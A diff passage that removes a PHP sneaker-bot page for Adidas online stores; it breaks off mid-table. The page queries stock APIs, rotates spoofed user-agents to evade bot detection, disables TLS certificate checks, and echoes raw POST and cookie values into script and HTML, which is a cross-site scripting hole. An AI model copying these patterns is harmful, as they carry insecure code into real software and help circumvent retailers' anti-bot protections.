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)
-    repeat
-    left center;
-    }
-    h1 {
-    left: 0;
-    line-height: 200px;
-    margin: auto;
-    margin-top: -100px;
-    position: absolute;
-    top: 50%;
-    width: 100%;
-    }
-    </style>
-  </head>
-  <?php
-
-    $useragents=array(
-      "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4",
-      "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4",
-      "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X; en-us) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53",
-      "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
-      "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
-      "Mozilla/5.0 (iPad; CPU OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53",
-      "Mozilla/5.0 (iPad; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5",
-      "Mozilla/5.0 (Linux; U; en-us; KFAPWI Build/JDQ39) AppleWebKit/535.19 (KHTML, like Gecko) Silk/3.13 Safari/535.19 Silk-Accelerated=true",
-      "Mozilla/5.0 (Linux; U; en-us; KFTHWI Build/JDQ39) AppleWebKit/535.19 (KHTML, like Gecko) Silk/3.13 Safari/535.19 Silk-Accelerated=true",
-      "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-us; Silk/1.0.141.16-Gen4_11004310) AppleWebkit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16 Silk-Accelerated=true",
-      "Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; Nexus S Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
-      "Mozilla/5.0 (Linux; Android 4.3; Nexus 7 Build/JSS15Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.72 Safari/537.36",
-      "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19",
-      "Mozilla/5.0 (BB10; Touch) AppleWebKit/537.10+ (KHTML, like Gecko) Version/10.0.9.2372 Mobile Safari/537.10+",
-      "Mozilla/5.0 (Linux; Android 4.3; Nexus 10 Build/JSS15Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.72 Safari/537.36",
-      "Mozilla/5.0 (Linux; U; Android 2.3; en-us; SAMSUNG-SGH-I717 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
-      "Mozilla/5.0 (Linux; U; Android 4.3; en-us; SM-N900T Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
-      "Mozilla/5.0 (Linux; U; Android 4.0; en-us; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
-      "Mozilla/5.0 (Linux; Android 4.2.2; GT-I9505 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mobile Safari/537.36",
-      "Mozilla/5.0 (Linux; U; Android 2.2; en-us; SCH-I800 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
-      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36");
-
-    $marketsList=[];
-    $marketsList['AT']='de_AT';
-    $marketsList['AU']='en_AU';
-    $marketsList['BE']='fr_BE';
-    $marketsList['BR']='pt_BR';
-    $marketsList['CA']='en_CA';
-    $marketsList['CL']='es_CL';
-    $marketsList['CO']='es_CO';
-    $marketsList['CZ']='cz_CZ';
-    $marketsList['DE']='de_DE';
-    $marketsList['DK']='da_DK';
-    $marketsList['ES']='es_ES';
-    $marketsList['FI']='fi_FI';
-    $marketsList['FR']='fr_FR';
-    $marketsList['IE']='id_ID';
-    $marketsList['IT']='it_IT';
-    $marketsList['MX']='es_MX';
-    $marketsList['NL']='nl_NL';
-    $marketsList['NZ']='en_NZ';
-    $marketsList['PL']='pl_PL';
-    $marketsList['RU']='ru_RU';
-    $marketsList['SE']='sv_SE';
-    $marketsList['SK']='sk_SK';
-    $marketsList['GB']='en_GB';
-    $marketsList['US']='en_US';
-
-    $marketDomainList=[];
-    $marketDomainList["AT"]="adidas.at";
-    $marketDomainList["AU"]="adidas.com.au";
-    $marketDomainList["BE"]="adidas.be";
-    $marketDomainList["BR"]="adidas.com.br";
-    $marketDomainList["CA"]="adidas.ca";
-    $marketDomainList["CL"]="adidas.cl";
-    $marketDomainList["CO"]="adidas.co";
-    $marketDomainList["CZ"]="adidas.cz";
-    $marketDomainList["DE"]="adidas.de";
-    $marketDomainList["DK"]="adidas.dk";
-    $marketDomainList["ES"]="adidas.es";
-    $marketDomainList["FI"]="adidas.fi";
-    $marketDomainList["FR"]="adidas.fr";
-    $marketDomainList["IE"]="adidas.ie";
-    $marketDomainList["IT"]="adidas.it";
-    $marketDomainList["MX"]="adidas.mx";
-    $marketDomainList["NL"]="adidas.nl";
-    $marketDomainList["NZ"]="adidas.co.nz";
-    $marketDomainList["PL"]="adidas.pl";
-    $marketDomainList["RU"]="adidas.ru";
-    $marketDomainList["SE"]="adidas.se";
-    $marketDomainList["SK"]="adidas.sk";
-    $marketDomainList["GB"]="adidas.co.uk";
-    $marketDomainList["US"]="adidas.com";
-  ?>
-  <body onload="checkCookie()">
-      <?php if ( (isset($_POST['setParameters'])) && (strlen($_POST['setParameters'])>0) ): ?>  <!-- Process parameter change -->
-        <script>
-          setCookie("d3stripesSku", "<?php echo $_POST["d3stripesSku"]; ?>", 365);
-          setCookie("d3stripesLocale", "<?php echo $_POST["d3stripesLocale"]; ?>", 365);
-          setCookie("d3stripesSiteKey", "<?php echo $_POST["d3stripesSiteKey"]; ?>", 365);
-          setCookie("d3stripesClientId", "<?php echo $_POST["d3stripesClientId"]; ?>", 365);
-        </script>
-        <?php
-            //Sku
-            @setcookie("d3stripesSku",$_POST['d3stripesSku']);
-            $_COOKIE['d3stripesSku']=$_POST['d3stripesSku'];
-            //Locale
-            @setcookie("d3stripesLocale",$_POST['d3stripesLocale']);
-            $_COOKIE['d3stripesLocale']=$_POST['d3stripesLocale'];
-            //Captcha Site-key
-            @setcookie("d3stripesSiteKey",$_POST['d3stripesSiteKey']);
-            $_COOKIE['d3stripesSiteKey']=$_POST['d3stripesSiteKey'];
-            //ClientId
-            @setcookie("d3stripesClientId",$_POST['d3stripesClientId']);
-            $_COOKIE['d3stripesClientId']=$_POST['d3stripesClientId'];
-        ?>
-      <?php endif; ?>
-      <?php if ( (isset($_POST['resetParameters'])) && (strlen($_POST['resetParameters'])>0) ): ?>  <!-- Display form for parameter change request-->
-        <h2>Set / Change Parameters</h2>
-        <form action="/d3stryr-3stripes.php" method="post">
-          <fieldset>
-          <table>
-            <tr>
-              <td id="headers">
-                <p>SKU<p>
-              </td>
-              <td>
-                <input type="text" size="50" value="<?php echo $_COOKIE["d3stripesSku"]; ?>" name="d3stripesSku" id="d3stripesSku"/>
-              </td>
-            </tr>
-            <tr>
-              <td id="headers"><p>Locale </p></td>
-              <td valign="middle">
-                <select name="d3stripesLocale">
-                  <option value="US">US</option>
-                  <option value="CA">CA (Canada)</option>
-                  <option value="GB">GB (United Kingdom)</option>
-                  <option value="AT">AT</option>
-                  <option value="AU">AU</option>
-                  <option value="BE">BE</option>
-                  <option value="BR">BR</option>
-                  <option value="CL">CL</option>
-                  <option value="CO">CO</option>
-                  <option value="CZ">CZ</option>
-                  <option value="DE">DE</option>
-                  <option value="DK">DK</option>
-                  <option value="ES">ES</option>
-                  <option value="FI">FI</option>
-                  <option value="FR">FR</option>
-                  <option value="IE">IE</option>
-                  <option value="IT">IT</option>
-                  <option value="MX">MX</option>
-                  <option value="NL">NL</option>
-                  <option value="NZ">NZ</option>
-                  <option value="PL">PL</option>
-                  <option value="RU">RU</option>
-                  <option value="SE">SE</option>
-                  <option value="SK">SK</option>
-                </select>
-              </td>
-            </tr>
-            <tr>
-              <td id="headers">
-                <p>Captcha SITE-KEY<p>
-              </td>
-              <td>
-                <input type="text" size="50" value="<?php echo $_COOKIE["d3stripesSiteKey"]; ?>" name="d3stripesSiteKey" id="d3stripesSiteKey"/>
-              </td>
-            </tr>
-            <tr>
-              <td id="headers">
-                <p>Client ID<p>
-              </td>
-              <td>
-                <input type="text" size="50" value="<?php echo $_COOKIE["d3stripesClientId"]; ?>" name="d3stripesClientId" id="d3stripesClientId"/>
-              </td>
-            </tr>
-            <tr>
-              <td>
-                <input type="hidden" value="True" name="setParameters" id="setParameters"/>
-                <input type="submit" value="Store Values" name="submit" id="submit"/>
-              </td>
-            </tr>
-          </table>
-          </fieldset>
-        </form>
-
-      <?php else: ?>  <!-- Proceed through the main code using values currently in cookie storage-->
-
-        <?php if ( (isset($_POST['sku'])) && (strlen($_POST['sku'])>0) ): ?>  <!-- Process the submit-->
-
-          <?php
-            //Parse POST parameters
-            $sku=$_POST['sku'];
-            $gcaptcha=$_POST['gcaptcha'];
-            $clientId=$_POST['clientId'];
-            $locale=$_POST['locale'];
-
-            $baseADCURL="http://www.".$marketDomainList[$locale]."/on/demandware.store/Sites-adidas-".$locale."-Site/".$marketsList[$locale];
-            $atcURL=$baseADCURL."/Cart-MiniAddProduct";
-            $stockURL=$baseADCURL."/Product-GetVariants?pid=".$sku;
-
-            //Thanks to @PythonKicks/TWTR for the logical fix below for CANADA and MEXICO
-            if (($locale == "US")||($locale == "CA")||($locale == "MX"))
-            {
-              $url="http://production-us-adidasgroup.demandware.net/s/adidas-".$locale."/dw/shop/v16_5/products/".$sku."?client_id=".$clientId."&expand=availability,variations,prices";
-            }
-            else
-            {
-              $url="http://production.store.adidasgroup.demandware.net/s/adidas-".$locale."/dw/shop/v16_5/products/".$sku."?client_id=".$clientId."&expand=availability,variations,prices";
-            }
-
-            //Randomize our User-Agent
-            $useragent=$useragents[rand()%sizeof($useragents)];
-            $curl = curl_init();
-            curl_setopt($curl,CURLOPT_HEADER,false);
-            curl_setopt($curl,CURLOPT_FOLLOWLOCATION, 1);
-            curl_setopt($curl,CURLINFO_HEADER_OUT, 1);
-            curl_setopt($curl,CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($curl,CURLOPT_SSL_VERIFYPEER, 0);
-            curl_setopt($curl,CURLOPT_SSL_VERIFYHOST, 0);
-            curl_setopt($curl,CURLOPT_USERAGENT, $useragent);
-            curl_setopt($curl,CURLOPT_HTTPHEADER, array("User-Agent:".$useragent));
-            curl_setopt($curl,CURLOPT_URL, $url);
-            $response = curl_exec($curl) or die(curl_error($curl));
-            curl_setopt($curl,CURLOPT_URL, $stockURL);
-            $responseStock = curl_exec($curl) or die(curl_error($curl));
-            $exceptionType="None";
-            $exception=False;
-            $stockException=False;
-            $clientStockException=False;
-            $variations=[];
-            $sizeLookup=[];
-
-            //Get product information
-            try
-            {
-              @$JSON=(json_decode($response,true));
-              if (isset($JSON["id"]))
-              {
-                @$productId=$JSON["id"];
-                @$productInventory=$JSON["inventory"]["ats"];
-                @$productStock=$JSON["inventory"]["stock_level"];
-                @$productMasterId=$JSON["master"]["master_id"];
-                @$productName=$JSON["name"];
-                @$productPrice=$JSON["variants"][0]["price"]." ".$locale." Currency";
-                @$productCollection=$JSON["c_collection"][0];
-                @$productColor=$JSON["c_color"];
-                @$productDivision=$JSON["c_division"];
-              }
-              else
-              {
-                throw new Exception();
-              }
-            }
-            catch (Exception $e)
-            {
-              $exceptionType="Loading product JSON";
-            }
-            //Check if the field is set
-            if (isset($JSON["c_enableTwitterBuyButton"]))
-            {
-              $productTwitterBuyable=(string) $JSON["c_enableTwitterBuyButton"];
-            }
-            else
-            {
-              $productTwitterBuyable="False";
-            }
-
-            //Create lookup table such that sizeLookup["600"]==>"8.5"
-            try
-            {
-              $sizeLookup=[];
-              if (isset($JSON["variation_attributes"][0]["values"]))
-              {
-                foreach($JSON["variation_attributes"][0]["values"] as $variation)
-                {
-                  $sizeLookup[$variation["value"]]=$variation["name"];
-                }
-              }
-              else
-              {
-                throw new Exception();
-              }
-            }
-            catch (Exception $e)
-            {
-              $exceptionType="Creating size lookup table";
-            }
-
-            //Variant array
-            try
-            {
-              if (isset($JSON["variants"]))
-              {
-                foreach($JSON["variants"] as $variation)
-                {
-                  $newVariation=[];
-                  $newVariation[0]=$variation["product_id"];
-                  $newVariation[1]=$variation["variation_values"]["size"];
-                  if ($variation["orderable"])
-                  {
-                    $newVariation[2]="Yes";
-                  }
-                  else
-                  {
-                    $newVariation[2]="No";
-                  }
-                  array_push($variations,$newVariation);
-                }
-              }
-              else
-              {
-                throw new Exception();
-              }
-            }
-            catch (Exception $e)
-            {
-              $exceptionType="Creating array of variants";
-            }
-
-            //Stock count from clientId endpoint
-            try
-            {
-              if (isset($JSON["variants"]))
-              {
-                $queryString="";
-                foreach($JSON["variants"] as $variation)
-                {
-                  $queryString=$queryString.$variation["product_id"].",";
-                }
-
-                 //Thanks to @PythonKicks/TWTR for the logical fix below for CANADA and MEXICO
-                if (($locale == "US")||($locale == "CA")||($locale == "MX"))
-                {
-                  $urlClientStock="http://production-us-adidasgroup.demandware.net/s/adidas-".$locale."/dw/shop/v16_5/products/(".$queryString.")?client_id=".$clientId."&expand=availability,variations,prices";
-                }
-                else
-                {
-                  $urlClientStock="http://production.store.adidasgroup.demandware.net/s/adidas-".$locale."/dw/shop/v16_5/products/(".$queryString.")?client_id=".$clientId."&expand=availability,variations,prices";
-                }
-
-                curl_setopt($curl,CURLOPT_URL, $urlClientStock);
-                $responseClientStock = curl_exec($curl) or die(curl_error($curl));
-                curl_close($curl);
-
-                $clientStockCount=[];
-                @$clientStockJSON=(json_decode($responseClientStock,true));
-                if (isset($clientStockJSON))
-                {
-                  foreach($clientStockJSON["data"] as $variant)
-                  {
-                    $clientStockCount[$variant["id"]]=(int) $variant["inventory"]["stock_level"];
-                  }
-                }
-                else
-                {
-                  throw new Exception();
-                }
-              }
-              else
-              {
-                throw new Exception();
-              }
-            }
-            catch (Exception $e)
-            {
-              $clientStockException=True;
-              $exceptionType="Loading client stock";
-            }
-
-            //Stock count from Product-GetVariants endpoint
-            try
-            {
-              $stockCount=[];
-              @$stockJSON=(json_decode($responseStock,true));
-              if (isset($stockJSON))
-              {
-                foreach($stockJSON["variations"]["variants"] as $variant)
-                {
-                  $stockCount[$variant["id"]]=(int) $variant["ATS"];
-                }
-              }
-              else
-              {
-                throw new Exception();
-              }
-            }
-            catch (Exception $e)
-            {
-              $stockException=True;
-              $exceptionType="Loading current stock";
-            }
-          ?>
-          <?php if (isset($JSON["id"])): ?>
-            <h2>
-              <table>
-                <tr><td id="headers"><b>Locale         </b></td><td><?php echo $locale;?>               </td></tr>
-                <tr><td id="headers"><b>MasterId       </b></td><td><?php echo $productMasterId;?>      </td></tr>
-                <tr><td id="headers"><b>Name           </b></td><td><?php echo $productName;?>          </td></tr>
-                <tr><td id="headers"><b>Collection     </b></td><td><?php echo $productCollection;?>    </td></tr>
-                <tr><td id="headers"><b>Color          </b></td><td><?php echo $productColor;?>         </td></tr>
-                <tr><td id="headers"><b>Division       </b></td><td><?php echo $productDivision;?>      </td></tr>
-                <tr><td id="headers"><b>Inventory      </b></td><td><?php echo $productInventory;?>     </td></tr>
-                <tr><td id="headers"><b>Stock          </b></td><td><?php echo $productStock;?>         </td></tr>
-                <tr><td id="headers"><b>Price          </b></td><td><?php echo $productPrice;?>         </td></tr>
-                <tr><td id="headers"><b>Twitter Buyable</b></td><td><?php echo $productTwitterBuyable;?></td></tr>
-                <tr><td id="headers"><b>Exceptions     </b></td><td><?php echo $exceptionType;?>        </td></tr>
-              </table>
-            </h2>
-            <h2>
-              <table>
-                <tr>
-                  <th id="headers">Product Id</th>
-                  <th id="headers">Orderable*</th>
-                  <th id="headers">Current<br>Stock</th>
-                  <th id="headers">Client<br>Stock</th>
-                  <th id="headers">Size<br>(US)</th>
-                  <th id="headers">ATC<br><br>
-                    <?php if (strlen($gcaptcha)<1): ?>
-                      <br><font color="red">CAPTCHA<br>UNSOLVED</font>
-                    <?php else: ?>
-                      <br><font color="green">CAPTCHA<br>SOLVED</font>
-                    <?php endif; ?>
-                  </th>
-                  <th id="headers">ATC<br>+<br>ClientId
-                    <?php if (strlen($gcaptcha)<1): ?>
-                      <br><font color="red">CAPTCHA<br>UNSOLVED</font>
-                    <?php else: ?>
-                      <br><font color="green">CAPTCHA<br>SOLVED</font>
-                    <?php endif; ?>
-                  </th>
-                  <th id="headers">ATC<br>via<br>Cont. Shopping
-                    <?php if (strlen($gcaptcha)<1): ?>
-                      <br><font color="red">CAPTCHA<br>UNSOLVED</font>
-                    <?php else: ?>
-                      <br><font color="green">CAPTCHA<br>SOLVED</font>
-                    <?php endif; ?>
-                  </th>
-                </tr>
-              <?php foreach($variations as $variant): ?>
-                <tr>
-                  <td>
-                      <?php echo $variant[0]; ?>
-                  </td>
-                  <td><center><?php echo $variant[2]; ?></center></td>
-                  <?php if (!$stockException): ?>
-                    <?php if ($stockCount[$variant[0]] > 0): ?>
